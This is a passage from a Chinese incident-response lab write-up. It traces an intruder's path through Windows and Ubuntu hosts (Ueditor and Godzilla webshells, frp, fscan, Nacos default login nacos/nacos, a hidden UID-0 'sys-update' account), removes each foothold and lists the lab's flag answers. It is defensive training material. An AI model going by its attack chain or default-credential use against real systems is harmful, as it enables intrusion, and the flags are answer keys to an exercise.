![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaVKcgKJoZo5ypXlmofNvYDibgfgiciaY2icRNiaKibnSicv0P8MXLqibvTeWHyQ/640?wx_fmt=png&from=appmsg "")  
  
故本题flag为：flag{31527b4001257a29c68c357a15376e59}  
#### 11. 安全加固  
>   
> 清除攻击者上传的所有恶意文件，清除完毕后前往C:\Users\Administrator\Desktop\flag\3.txt读取flag  
  
  
这个就是最后排查到的frp和fscan程序了，他在downloads目录下，直接全选删除即可  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaxCpoPgIFdZK5uN6w5Nm5169Om7erBvAN9Xx1UkGdOI6vN4Vr7iabkqg/640?wx_fmt=png&from=appmsg "")  
  
删除完毕后前往flag目录下查看flag  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaXOHX5xR2f0su1AOtRBT7ufLkPIhs9DicnJfggm9M6Juv9sJDnib3rpSA/640?wx_fmt=png&from=appmsg "")  
  
故本题flag为：flag{42a996202210e8572eebae2968f393db}  
#### Windows排查复盘  
  
攻击者攻击思路：**攻击者前期进行WEB扫描->找到Ueditor编辑器->尝试利用漏洞->利用成功->上传webshell->执行命令->Windows defender查杀并隔离文件->攻击者上传哥斯拉webshell->攻击者关闭Windows defender->攻击者新建用户->攻击者远程登录获取终端权限->攻击者上传内网扫描攻击并进行后续内网渗透**  
#### 12. 内网渗透排查  
>   
> 开始排查Ubuntu(DMZ2)环境，通过前面排查的内网扫描结果以及攻击者上传的工具，攻击者对于内网机器Ubuntu(DMZ2)进行了漏洞利用，根据相关线索本地访问相关端口，攻击者为了权限维持，后期进行获取更多信息，提交攻击者在web端新增的账号，提交示例：flag{user}  
  
  
现在打开Ubuntu(DMZ2)环境，获取IP  
1. 如下图所示为本次环境中的Linux环境  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaM9edn3oWH6Swe1aSt6UAA50y0LZCVF6vVGUs1J9shy8Ld4gq0sWLVg/640?wx_fmt=png&from=appmsg "")  
1. 如果使用finalshell等程序远程控制，可进入系统登录后执行ifconfig查看当前IP  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iayw8cvGBG9uWgCrObPAV9Kd2Tbdpxum6XAZ80nlbpVCTfG8yTL9Pu7A/640?wx_fmt=png&from=appmsg "")  
1. 如没有看到IP，则可能是虚拟网卡配置原因，可查看是否为NAT等配置  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iacU0jHQUAP6Dfsdpx4cBQBE2CpTxaEUBveCaVibQTOCp81VNLicw7Z0Kg/640?wx_fmt=png&from=appmsg "")  
  
如下我本地显示IP为：192.168.59.21  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iabLicuz8YUMRSM7gicpsiakUlDY2icjEAvpicZ8Vb215icSb65UhQ6XjNyYhw/640?wx_fmt=png&from=appmsg "")  
  
已知攻击者fscan扫描到192.168.59.2  
的8848  
端口存在nacos漏洞，先执行netstat -lntp  
看看8848端口是否已开启  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaNVfBFDQtmRPOKeMDSVQNsDBmxo9t8H5H3PT4X1uxflQIMyJcr5FibcQ/640?wx_fmt=png&from=appmsg "")  
  
直接用宿主机访问8848端口  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaqTcCyqd924jm2sJTCzVNSl8BybaLN9kjsDeiaJFjiaIy6nXb2k3Qscsg/640?wx_fmt=png&from=appmsg "")  
  
nacos默认账号密码为：nacos/nacos  
，若实战中遇到一些系统时，先搜索是个好习惯  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaibyWelGNPcm53QyhwLp9mchE8nV34IMawJQ7c5mpUeA8lQoWWaf8nXA/640?wx_fmt=png&from=appmsg "")  
  
且通过前面的fscan扫描结果看到nacos也存在漏洞  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia2ekVicFH7ia7yAVic6C1E52KAlpWuUM21Q4BfJFVbWJLNWrue2gBtZUYQ/640?wx_fmt=png&from=appmsg "")  
  
nacos往往会存储一些敏感配置文件，比如：oss存储桶key、数据库、redis账号密码等  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iajn9yVeqgKjKgw7vUOPzqiclpYfDz327ibibgYlQMO45mMQXXSkfRAKzAQ/640?wx_fmt=png&from=appmsg "")  
  
这次环境也不例外，config配置中存放了ssh的账号密码，也为后续攻击者获取终端权限做了铺垫  
  
攻击者在获取了敏感信息后又增加了一个nacos账号，以在后续登录获取更新内容，在用户列表可以看到  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia0J5qYEXSnSFdljnOQc4HRNo1loJW6oiar4EIv2mibDzj3mzian9WLbLUg/640?wx_fmt=png&from=appmsg "")  
  
nacos安装后默认只有nacos用户名，结合前面Windows排查到的$system  
断定攻击者一直想要伪装系统用户，这个账号就是新增的web账号  
  
故本题flag为：flag{system}  
#### 13. 内网渗透排查  
>   
> 攻击者在web端获取到了敏感信息后获取到了终端权限，写入了隐藏用户，提交其用户名，提交示例：flag{user}  
  
  
攻击者在nacos获取到了ssh的账号密码后登录系统，为了后续持续化控制，加了一个隐藏用户，非常合理  
  
先执行命令：cat /etc/passwd|grep /bin/ba  
目的是为了查看谁有登录权限  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaOT1R3Pj6bMTaZ7MIDIsvEffleWAmibRza13PZ9yljj2yUJLX2rkiac5A/640?wx_fmt=png&from=appmsg "")  
  
具备登录权限的账号有：root、sys-update、solar  
，值得注意的是这个sys-update  
又和系统有关联，不要被迷惑，有几点可疑的地方  
- 它的家目录在/var/tmp/.sys而不是/home  
  
- 它的家目录是隐藏目录.sys  
  
- 它的uid为：root权限0而非像solar这种1000  
  
再看一下/var/tmp/.sys  
下有什么文件：ls -la /var/tmp/.sys  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iac586ccJRDwxwgtHnbrgEWw1SqSk41DXdpt0fIicScJt6XAUVNSCa4tA/640?wx_fmt=png&from=appmsg "")  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia70Ovu4ojb0ibibSDJly4y4J9ayKFqHtRsTJ9lDribFVYMmWUJzWIH2aOQ/640?wx_fmt=png&from=appmsg "")  
  
只有.ssh公钥文件目录，这非常可疑，故本题flag为：flag{sys-update}  
#### 14. 安全加固  
>   
> 清除攻击者在web端新增的用户名后，前往/var/flag/1文件中读取flag并提交  
  
  
这个直接前往nacos的用户列表删除system即可  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iawBerZ4JOHmtzCYqWsEqdpxwt7hcyvQqdS1owp45ZjeHONaxeYbcHMA/640?wx_fmt=png&from=appmsg "")  
  
删除完成后前往/var/flag/1  
查看flag  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia6JvOUEGy0vCTqic0VENQduksExrZ9LlTW9GLQHZcVFTDet0Fqm9Xmbw/640?wx_fmt=png&from=appmsg "")  
  
故本题flag为：flag{ad31ea22e324ee6effd454decf7477c9}  
#### 15. 安全加固  
>   
> 清除攻击者在服务器新增的用户名所有信息，前往/var/flag/2文件中读取flag并提交  
  
  
在尝试清除 sys-update  
 用户时，我们发现直接使用 userdel  
 命令可能会报错或提示进程占用。这是因为攻击者将其 UID 设置为了 **0**  
（即 root 权限），系统会将其误判为当前正在登录的 root 用户。 ****  
  
**处置建议：**  
 面对这种利用 UID 0 伪装的高权限后门，最彻底且安全的方法是直接编辑 /etc/passwd  
 和 /etc/shadow  
 文件，手动删除对应的行，并强制删除其伪造的家目录 /var/tmp/.sys。  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaibnSERcp9IcTaf5DcaX0RA9xcGNYAM2uBSwkgjGsha44IBeIImgK8bQ/640?wx_fmt=png&from=appmsg "")  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia9tvzdl1RVSL3MrYLYGAQBLuyrGeribNpyY5UXf17wsOnFkGOkwYeYdA/640?wx_fmt=png&from=appmsg "")  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaNHVLic6fxIHsScQhp3lpGVKe4X619gxIGABGaX6zBiak6NicWnp9ynOvw/640?wx_fmt=png&from=appmsg "")  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaLfiaOtHuborxxU7RfkO9WdaHHBBVXAibxTM8YSXXhic3Zu3xtSeZeDo5w/640?wx_fmt=png&from=appmsg "")  
  
然后去/var/flag查看flag  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia56O74lGkvFibM42xnyenia8zXQTJqHqv9xUJQI84Lsy3AuGquvysxwUw/640?wx_fmt=png&from=appmsg "")  
#### 16. 安全加固  
>   
> 当前web端存在漏洞，先停止此web服务进程后，前往/var/flag/3文件中读取flag并提交  
  
  
nacos存在漏洞，只删除system用户没用，所以在修复漏洞前最好的方法是暂时停止系统运行，这里可使用systemctl stop nacos  
停止，也可以前往nacos目录停止，如果无法确定中间件的具体安装路径，我们可以使用 find / -name nacos 2>/dev/null  
 命令进行全盘定位，随后进入 bin 目录执行 shutdown 脚本。  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaC4JcoRLAXxAzHUzxYm9ObS3ARCNIU3QtRo3vcz8AZu8QhVX8NyQbMA/640?wx_fmt=png&from=appmsg "")  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iadZ3flgfgiciaAaLObib1uZhAs9WlZuqzLMS04glhRSDb5PUI20E0R8l7w/640?wx_fmt=png&from=appmsg "")  
  
前往bin目录下，执行./shutdown.sh  
停止服务，完成后前往/var/flag/3读取flag  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaOJvdHiaOO8fABMSU0VooUvl0zCNrNSot8laOoX3Jco31Ip8lJZ3I2jA/640?wx_fmt=png&from=appmsg "")  
  
故本题flag为：flag{163e32607debcc6091e993929afe8064}  
#### 17. 安全加固  
>   
> 攻击者通过web漏洞拿到了root账号密码，请修改密码后，前往/var/flag/4文件中读取flag并提交  
  
  
前面已经知道攻击者通过nacos服务获取到root的账号密码，后面远程登录做了隐藏账户，所以root账户密码必须改  
  
执行命令passwd root  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaXbsT2DSHe0o3GdZx67WIrrnUQy0bPzTEptnBhIntY9GckiakavtbBYA/640?wx_fmt=png&from=appmsg "")  
  
然后读取/var/flag/4  
中的flag提交  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaBpDEqrc18y5P8JJeLLyYwricw3PG8cFO6fzXvO7NNaFGKTUicJicH8sYw/640?wx_fmt=png&from=appmsg "")  
  
故本题flag：flag{2d1848c8560becac27d30a5d4daf6da3}  
#### Linux排查复盘  
  
在前面攻击者利用fscan扫描到另一个网段的192.168.59.2  
存在nacos漏洞后，立刻使用frp做了内网穿透并带外流量，利用nacos漏洞成功后又新增了nacos服务用户，想要以system用户名混淆视听，接着又登录ssh服务，为了权限维持新增了具有root权限的账号：sys-update  
以及公私钥做权限维持  
### 三、总结  
  
至此，我们完成了一次针对 DMZ 区域混合环境的完整应急响应排查。  
  
从这道题目中，我们可以提炼出应急响应的几个核心逻辑：  
1. **凡走过必留痕**  
：无论是 Linux 的 .bash_history、/var/log/secure，还是 Windows 的 Security.evtx，日志永远是我们还原现场的第一手证据。  
  
1. **警惕灯下黑**  
：攻击者非常善于伪装。比如本题中将恶意用户命名为 sys-update 并赋予 UID 0，或者将 WebShell 混淆在正常的业务目录中。这就要求我们在排查时，不能只看表面文件名，更要关注文件属性（如创建时间、权限掩码）和内容特征。  
  
1. **闭环思维**  
：应急响应不仅仅是“删掉病毒”，更重要的是**封堵入口**  
。如果只清理了后门而没有修复 Nacos 的漏洞，攻击者分分钟就能卷土重来。  
  
希望这套开源环境和 WP 能为大家的日常学习提供一点帮助。正如我常说的，**人力资源就是最好的投资**  
，如果您在练习过程中遇到问题，或者有关于勒索病毒处理、渗透测试的需求，欢迎随时加我好友交流。  
  
路漫漫其修远兮，吾将上下而求索。下期见！  
  
往期文章分享  
<table><tbody><tr><td data-colwidth="576"><section style="text-align: center;"><span leaf=""><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490451&amp;idx=1&amp;sn=4313bbf3307747f86b1ca4c043e860a7&amp;scene=21#wechat_redirect" textvalue="应急响应|全网首发！变种勒索病毒仿真靶场：从排查到解密(附开源训练环境)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|全网首发！变种勒索病毒仿真靶场：从排查到解密(附开源训练环境)</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490313&amp;idx=1&amp;sn=8dab7d5f2158f8368ab0d7df67e4bf01&amp;scene=21#wechat_redirect" textvalue="应急响应|记一次针对AIR勒索病毒的溯源过程" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|记一次针对AIR勒索病毒的溯源过程</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490187&amp;idx=1&amp;sn=068b8c8dc7adf0dc2639412bff8b97c1&amp;scene=21#wechat_redirect" textvalue="学习干货|从网线到攻防，一起学习网络基础、安全原理与密码学知识！建议收藏" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">学习干货|从网线到攻防，一起学习网络基础、安全原理与密码学知识！建议收藏</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490072&amp;idx=1&amp;sn=5b905316b7251c03175197340ca0ff47&amp;scene=21#wechat_redirect" textvalue="应急响应|某项目特洛伊挖矿木马靶场复现(附开源环境)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|某项目特洛伊挖矿木马靶场复现(附开源环境)</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-indent: 0px;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489973&amp;idx=1&amp;sn=3004b71de912f0e6d09b31822ac23a4a&amp;scene=21#wechat_redirect" textvalue="学习干货|从迷茫到前行：我的网络安全学习之路" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">学习干货|从迷茫到前行：我的网络安全学习之路</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489934&amp;idx=1&amp;sn=031d5ed1ed25601b36ab5e201c3ca54c&amp;scene=21#wechat_redirect" textvalue="应急响应|2025年勒索病毒排查溯源指南(附开源训练环境)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|2025年勒索病毒排查溯源指南(附开源训练环境)</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489784&amp;idx=1&amp;sn=d9081baca8aa3a0a649f5857fc2703f8&amp;scene=21#wechat_redirect" textvalue="应急响应真没这么难！速看某公交系统靶机应急响应排查思路" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应真没这么难！速看某公交系统靶机应急响应排查思路</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489716&amp;idx=1&amp;sn=5e444d94dd23e79a628b72b5d9fbb86e&amp;scene=21#wechat_redirect" textvalue="渗透测试|小白也能学会渗透测试！某医院HIS系统渗透测试靶场学习" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">渗透测试|小白也能学会渗透测试！某医院HIS系统渗透测试靶场学习</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489580&amp;idx=1&amp;sn=cffaf95fd15270a89cb320bea6e35a4f&amp;scene=21#wechat_redirect" textvalue="应急演练|深入浅出分析某海外能源巨头勒索模拟演练过程" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急演练|深入浅出分析某海外能源巨头勒索模拟演练过程</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489397&amp;idx=1&amp;sn=8107187ce38a0e38e1fd54e50d72af33&amp;scene=21#wechat_redirect" textvalue="应急响应|学校不教的我来教！某学校系统中挖矿病毒的超详细排查思路" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|学校不教的我来教！某学校系统中挖矿病毒的超详细排查思路</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489057&amp;idx=1&amp;sn=1346c8c7e633a4a26ceed0a238eac278&amp;scene=21#wechat_redirect" textvalue="开源万岁|我妈说我奶想学习了，让我给搭建一个知识库学学IT" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">开源万岁|我妈说我奶想学习了，让我给搭建一个知识库学学IT</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 